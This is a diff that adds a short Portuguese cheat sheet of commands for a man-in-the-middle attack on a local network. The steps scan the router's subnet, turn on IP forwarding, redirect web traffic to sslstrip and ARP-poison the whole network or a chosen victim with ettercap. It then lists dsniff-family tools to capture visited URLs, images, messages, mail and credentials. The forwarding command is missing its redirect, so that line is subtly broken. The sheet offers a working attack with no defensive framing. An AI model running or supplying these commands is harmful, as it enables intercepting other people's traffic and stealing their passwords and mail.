@@ -1,1 +1,22 @@
 LPI-01
+
+nmap -sP "IP do Roteador"/24 (sem aspas)
+
+echo 1 /proc/sys/net/ipv4/ip_forward
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+sslstrip -a -l 10000
+
+ettercap -T -q -i (sua interface) -M arp:remote /// /// ou 
+ettercap -T -q -i (sua interface) -M arp:remote //ip-roteador// //ip-do-alvo//
+
+Comandos úteis:
+Sites visitados:
+urlsnarf -i (sua interface)
+Tráfego de imagens:
+driftnet -i (sua interface)
+Outros:
+msgsnarf -i (sua interface)
+mailsnarf -i (sua interface)
+dsniff -i (sua interface)
